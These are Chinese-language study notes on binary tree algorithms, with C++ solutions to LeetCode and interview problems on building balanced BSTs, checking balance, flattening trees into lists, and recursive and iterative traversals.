<p>【<strong>哈希表</strong>】：unordered_map、unordered_set，unordered_map、unordered_set</p>
<ul>
<li>【<strong>深度优先遍历</strong>】：栈其实就是递归的一种实现结构，也就说前中后序遍历的逻辑其实都是可以借助<strong>栈</strong>使用非递归的方式来实现的。</li>
<li>【<strong>广度优先遍历</strong>】：一般使用<strong>队列</strong>来实现，这也是队列先进先出的特点所决定的，因为需要先进先出的结构，才能一层一层的来遍历二叉树。</li>
</ul>
<p><strong>二叉树 定义：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    TreeNode *left;</span><br><span class="line">    TreeNode *right;</span><br><span class="line">    <span class="built_in">TreeNode</span>(<span class="keyword">int</span> x) : <span class="built_in">val</span>(x), <span class="built_in">left</span>(<span class="literal">NULL</span>), <span class="built_in">right</span>(<span class="literal">NULL</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>递归的实现就是：每一次递归调用都会把函数的局部变量、参数值和返回地址等<strong>压入调用栈中</strong>，然后递归返回的时候，从栈顶弹出上一次递归的各项参数<br><strong>递归算法：</strong></p>
<ul>
<li>【确定递归函数的 参数 和 返回值】</li>
<li>【确定终止条件】：写完了递归算法, 运行的时候，经常会遇到栈溢出的错误，就是没写终止条件或者终止条件写的不对，操作系统也是用一个栈的结构来保存每一层递归的信息，如果递归没有终止，操作系统的内存栈必然就会溢出。</li>
<li>【确定单层递归的逻辑】： 确定每一层递归需要处理的信息。在这里也就会重复调用自己来实现递归的过程。<h3 id="面试题-04-02-最小高度树"><a href="#面试题-04-02-最小高度树" class="headerlink" title="面试题 04.02. 最小高度树"></a>面试题 04.02. 最小高度树</h3>给定一个<strong>有序整数数组</strong>，元素各不相同且按【升序排列】，编写一个算法，创建一棵高度最小的<strong>二叉搜索树</strong>。</li>
</ul>
<p><strong>【二叉搜索树】</strong> 又称二叉排序树，具有以下性质：</p>
<pre><code>若它的左子树不为空，则左子树上所有节点的值都小于根节点的值
若它的右子树不为空，则右子树上所有节点的值都大于根节点的值
它的左右子树也分别为二叉搜索树
</code></pre>
<p>注意：<strong>二叉搜索树中序遍历的结果是有序的</strong><br>二叉搜索树的中序遍历是升序序列，题目给定的数组是按照升序排序的有序数组，因此可以确保数组是二叉搜索树的<strong>中序遍历序列</strong>。</p>
<p><strong>分析：</strong><br>为了使二叉搜索树的高度最小，左右子树的节点数应尽可能接近，因此我们选择中间数字作为二叉搜索树的根节点，这样分给左右子树的数字个数相同或只相差 1，可以使得二叉搜索树的高度最小。如果数组长度是奇数，则根节点的选择是唯一的，如果数组长度是偶数，则可以选择中间位置左边的数字作为根节点或者选择中间位置右边的数字作为根节点，选择不同的数字作为根节点则创建的最小高度二叉搜索树也是不同的</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    中序遍历，总是选择中间位置 左边/右边 的数字作为根节点</span></span><br><span class="line"><span class="comment">    时间复杂度：O(n)，其中 n 是数组的长度。每个数字只访问一次。</span></span><br><span class="line"><span class="comment">    空间复杂度：O(log⁡n)，其中 n 是数组的长度。空间复杂度不考虑返回值，因此空间复杂度主要取决于递归栈的深度</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">sortedArrayToBST</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Create</span>(nums,<span class="number">0</span>,nums.<span class="built_in">size</span>()<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">TreeNode* <span class="title">Create</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums,<span class="keyword">int</span> left,<span class="keyword">int</span> right)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(left&gt;right)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> mid = (left+right)/<span class="number">2</span>;<span class="comment">//选择中间位置左边的数字作为 根节点（向下取整）</span></span><br><span class="line">        <span class="comment">//int mid = (left+right+1)/2;//选择中间位置右边的数字作为 根节点</span></span><br><span class="line">        <span class="comment">//int mid = (left+right+rand()%2)/2;//选择中间位置左边或者右边的数字作为 根节点</span></span><br><span class="line">        TreeNode* root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(nums[mid]);</span><br><span class="line">        root-&gt;left = <span class="built_in">Create</span>(nums,left,mid<span class="number">-1</span>);</span><br><span class="line">        root-&gt;right = <span class="built_in">Create</span>(nums,mid+<span class="number">1</span>,right);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="面试题-04-04-检查平衡性"><a href="#面试题-04-04-检查平衡性" class="headerlink" title="面试题 04.04. 检查平衡性"></a>面试题 04.04. 检查平衡性</h3><p>实现一个函数，检查二叉树是否平衡。在这个问题中，平衡树的定义如下：任意一个节点，其两棵子树的高度差不超过 1。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    递归——自顶向上</span></span><br><span class="line"><span class="comment">    O(n^2)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//用于计算二叉树中的任意一个节点 p 的高度</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">hight</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">max</span>(<span class="built_in">hight</span>(root-&gt;left),<span class="built_in">hight</span>(root-&gt;right)) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isBalanced</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span>   </span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">abs</span>(<span class="built_in">hight</span>(root-&gt;left)-<span class="built_in">hight</span>(root-&gt;right)) &lt;= <span class="number">1</span></span><br><span class="line">            &amp;&amp; <span class="built_in">isBalanced</span>(root-&gt;left) &amp;&amp; <span class="built_in">isBalanced</span>(root-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    递归——自底向上</span></span><br><span class="line"><span class="comment">    O(n)遍历每个结点一次</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">height</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> leftHeight = <span class="built_in">height</span>(root-&gt;left);</span><br><span class="line">        <span class="keyword">int</span> rightHeight = <span class="built_in">height</span>(root-&gt;right);</span><br><span class="line">        <span class="keyword">if</span>(leftHeight==<span class="number">-1</span> || rightHeight==<span class="number">-1</span> || <span class="built_in">abs</span>(leftHeight-rightHeight)&gt;<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">max</span>(leftHeight,rightHeight)+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isBalanced</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">height</span>(root) &gt;= <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="面试题-17-12-BiNode——二叉搜索树-gt-单向链表"><a href="#面试题-17-12-BiNode——二叉搜索树-gt-单向链表" class="headerlink" title="面试题 17.12. BiNode——二叉搜索树-&gt;单向链表"></a>面试题 17.12. BiNode——二叉搜索树-&gt;单向链表</h3><p>二叉树数据结构TreeNode可用来表示单向链表（其中left置空，right为下一个链表节点）。实现一个方法，<strong>把二叉搜索树转换为单向链表</strong>，要求依然符合二叉搜索树的性质，转换操作应是【原址的】，也就是在原始的二叉搜索树上直接修改。返回转换后的单向链表的头节点。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//中序遍历</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    TreeNode* ans = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">0</span>),*cur = ans;<span class="comment">//正在遍历的节点的上一个节点</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(TreeNode* node)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//进行中序遍历，每遍历到一个节点时，就将它的左孩子设为NULL，然后将它自身作为上一个节点的右孩子</span></span><br><span class="line">        <span class="built_in">dfs</span>(node-&gt;left);</span><br><span class="line">        node-&gt;left = <span class="literal">nullptr</span>;</span><br><span class="line">        cur-&gt;right = node;<span class="comment">//这里！</span></span><br><span class="line">        cur = node;</span><br><span class="line">        <span class="built_in">dfs</span>(node-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">convertBiNode</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">dfs</span>(root);</span><br><span class="line">        <span class="keyword">return</span> ans-&gt;right;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    TreeNode* p = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">0</span>);<span class="comment">//虚结点</span></span><br><span class="line">    TreeNode* p2 = p;</span><br><span class="line">    <span class="function">TreeNode* <span class="title">convertBiNode</span><span class="params">(TreeNode* root)</span> </span>&#123;    </span><br><span class="line">        <span class="built_in">dfs</span>(root);</span><br><span class="line">        <span class="keyword">return</span> p2-&gt;right;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="built_in">dfs</span>(root-&gt;left);</span><br><span class="line">            <span class="built_in">visit</span>(root);</span><br><span class="line">            <span class="built_in">dfs</span>(root-&gt;right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">visit</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">        root-&gt;left=<span class="literal">nullptr</span>;</span><br><span class="line">        p-&gt;right = root;</span><br><span class="line">        p = root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="114-二叉树展开为链表-按照【先序遍历】"><a href="#114-二叉树展开为链表-按照【先序遍历】" class="headerlink" title="114 二叉树展开为链表-按照【先序遍历】"></a>114 二叉树展开为链表-按照【先序遍历】</h3><p>给你二叉树的根结点 root ，请你将它展开为一个单链表：<br>展开后的单链表应该与二叉树【先序遍历】顺序相同。<br><img src="https://img-blog.csdnimg.cn/c275711df0f84173a8715d7ffb39e245.png"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    自己写的 正确</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">preorder</span><span class="params">(TreeNode *root, vector&lt;<span class="keyword">int</span>&gt;&amp; res)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        res.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">        <span class="built_in">preorder</span>(root-&gt;left,res);</span><br><span class="line">        <span class="built_in">preorder</span>(root-&gt;right,res);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">flatten</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="built_in">preorder</span>(root,res);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;res.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> value = res[i];</span><br><span class="line">            root-&gt;val = value;</span><br><span class="line">            root-&gt;left = <span class="literal">nullptr</span>;</span><br><span class="line">            <span class="keyword">if</span>(root-&gt;right)&#123;</span><br><span class="line">                root = root-&gt;right;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(i==res.<span class="built_in">size</span>()<span class="number">-1</span>)</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                TreeNode *node = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">0</span>);</span><br><span class="line">                root-&gt;right = node;</span><br><span class="line">                root = node;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*法二：</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">flatten</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;TreeNode*&gt; l;</span><br><span class="line">        <span class="built_in">preorderTraversal</span>(root, l);</span><br><span class="line">        <span class="keyword">int</span> n = l.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            TreeNode *prev = l.<span class="built_in">at</span>(i - <span class="number">1</span>), *curr = l.<span class="built_in">at</span>(i);</span><br><span class="line">            prev-&gt;left = <span class="literal">nullptr</span>;</span><br><span class="line">            prev-&gt;right = curr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">preorderTraversal</span><span class="params">(TreeNode* root, vector&lt;TreeNode*&gt; &amp;l)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            l.<span class="built_in">push_back</span>(root);</span><br><span class="line">            <span class="built_in">preorderTraversal</span>(root-&gt;left, l);</span><br><span class="line">            <span class="built_in">preorderTraversal</span>(root-&gt;right, l);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="108-将有序数组转换为二叉搜索树——同【最小高度树】"><a href="#108-将有序数组转换为二叉搜索树——同【最小高度树】" class="headerlink" title="108 将有序数组转换为二叉搜索树——同【最小高度树】"></a>108 将有序数组转换为二叉搜索树——同【最小高度树】</h3><p>给你一个整数数组 nums ，其中元素已经按 <strong>升序</strong> 排列（可以确保数组是二叉搜索树的中序遍历序列），请你将其转换为一棵 <strong>高度平衡</strong> <strong>二叉搜索树</strong>。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">sortedArrayToBST</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Create</span>(nums,<span class="number">0</span>,nums.<span class="built_in">size</span>()<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">TreeNode* <span class="title">Create</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums,<span class="keyword">int</span> left,<span class="keyword">int</span> right)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(left&gt;right)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">int</span> mid = (left+right)/<span class="number">2</span>;</span><br><span class="line">        TreeNode *root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(nums[mid]);<span class="comment">//新建结点</span></span><br><span class="line">        root-&gt;left = <span class="built_in">Create</span>(nums,left,mid<span class="number">-1</span>);</span><br><span class="line">        root-&gt;right = <span class="built_in">Create</span>(nums,mid+<span class="number">1</span>,right);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="144-二叉树的【前序】遍历——【根左右】"><a href="#144-二叉树的【前序】遍历——【根左右】" class="headerlink" title="144 二叉树的【前序】遍历——【根左右】"></a>144 二叉树的【前序】遍历——【根左右】</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    递归</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">preorder</span><span class="params">(TreeNode *root,vector&lt;<span class="keyword">int</span>&gt;&amp; res)</span></span>&#123;</span><br><span class="line">        <span class="comment">//终止条件</span></span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        res.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">        <span class="built_in">preorder</span>(root-&gt;left,res);</span><br><span class="line">        <span class="built_in">preorder</span>(root-&gt;right,res);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="built_in">preorder</span>(root,res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    迭代</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        stack&lt;TreeNode*&gt; stk;</span><br><span class="line">        TreeNode* node = root;</span><br><span class="line">        <span class="keyword">while</span> (!stk.<span class="built_in">empty</span>() || node != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">while</span> (node != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                res.<span class="built_in">emplace_back</span>(node-&gt;val);<span class="comment">//根</span></span><br><span class="line">                stk.<span class="built_in">emplace</span>(node);</span><br><span class="line">                node = node-&gt;left;<span class="comment">//左</span></span><br><span class="line">            &#125;</span><br><span class="line">            node = stk.<span class="built_in">top</span>();</span><br><span class="line">            stk.<span class="built_in">pop</span>();</span><br><span class="line">            node = node-&gt;right;<span class="comment">//右</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        stack&lt;TreeNode*&gt; st;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) <span class="keyword">return</span> result;</span><br><span class="line">        st.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span>(!st.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            TreeNode* node = st.<span class="built_in">top</span>(); <span class="comment">// 根</span></span><br><span class="line">            st.<span class="built_in">pop</span>();</span><br><span class="line">            result.<span class="built_in">push_back</span>(node-&gt;val);</span><br><span class="line">            <span class="keyword">if</span> (node-&gt;right) </span><br><span class="line">                st.<span class="built_in">push</span>(node-&gt;right);<span class="comment">//右</span></span><br><span class="line">            <span class="keyword">if</span> (node-&gt;left) </span><br><span class="line">                st.<span class="built_in">push</span>(node-&gt;left);<span class="comment">//左</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="145-二叉树的【后序】遍历【左右根】"><a href="#145-二叉树的【后序】遍历【左右根】" class="headerlink" title="145 二叉树的【后序】遍历【左右根】"></a>145 二叉树的【后序】遍历【左右根】</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    递归</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">postorder</span><span class="params">(TreeNode *root,vector&lt;<span class="keyword">int</span>&gt;&amp; res)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">postorder</span>(root-&gt;left,res);</span><br><span class="line">        <span class="built_in">postorder</span>(root-&gt;right,res);</span><br><span class="line">        res.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="built_in">postorder</span>(root,res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//迭代</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        stack&lt;TreeNode*&gt; st;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) <span class="keyword">return</span> result;</span><br><span class="line">        st.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span> (!st.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            TreeNode* node = st.<span class="built_in">top</span>();</span><br><span class="line">            st.<span class="built_in">pop</span>();</span><br><span class="line">            result.<span class="built_in">push_back</span>(node-&gt;val);</span><br><span class="line">            <span class="keyword">if</span> (node-&gt;left) </span><br><span class="line">                st.<span class="built_in">push</span>(node-&gt;left); <span class="comment">//左</span></span><br><span class="line">            <span class="keyword">if</span> (node-&gt;right) </span><br><span class="line">                st.<span class="built_in">push</span>(node-&gt;right); <span class="comment">//右</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">reverse</span>(result.<span class="built_in">begin</span>(), result.<span class="built_in">end</span>()); <span class="comment">//结果反转之后就是左右中的顺序了</span></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="94-二叉树的【中序】遍历——【左根右】"><a href="#94-二叉树的【中序】遍历——【左根右】" class="headerlink" title="94 二叉树的【中序】遍历——【左根右】"></a>94 二叉树的【中序】遍历——【左根右】</h3><p>给定一个二叉树的根节点 root ，返回 它的 中序 遍历 。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    递归</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">inorder</span><span class="params">(TreeNode* root,vector&lt;<span class="keyword">int</span>&gt;&amp; res)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!root)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">inorder</span>(root-&gt;left,res);</span><br><span class="line">        res.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">        <span class="built_in">inorder</span>(root-&gt;right,res);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="built_in">inorder</span>(root,res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//迭代</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        stack&lt;TreeNode*&gt; st;</span><br><span class="line">        TreeNode* cur = root;</span><br><span class="line">        <span class="keyword">while</span> (cur!=<span class="literal">NULL</span> || !st.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cur!=<span class="literal">NULL</span>) &#123;</span><br><span class="line">                st.<span class="built_in">push</span>(cur); </span><br><span class="line">                cur = cur-&gt;left;<span class="comment">//左</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cur = st.<span class="built_in">top</span>(); <span class="comment">//从栈里弹出的数据，就是要处理的数据（放进result数组里的数据）</span></span><br><span class="line">                st.<span class="built_in">pop</span>();</span><br><span class="line">                result.<span class="built_in">push_back</span>(cur-&gt;val);<span class="comment">//中</span></span><br><span class="line">                cur = cur-&gt;right;<span class="comment">//右</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="102-二叉树的【层序】遍历——【队列】"><a href="#102-二叉树的【层序】遍历——【队列】" class="headerlink" title="102 二叉树的【层序】遍历——【队列】"></a>102 二叉树的【层序】遍历——【队列】</h3><p><strong>图中的广度优先遍历——二叉树的层序遍历——队列</strong><br><img src="https://img-blog.csdnimg.cn/d19a780b3fd444c5b3f4d5f5ef035610.png"></p>
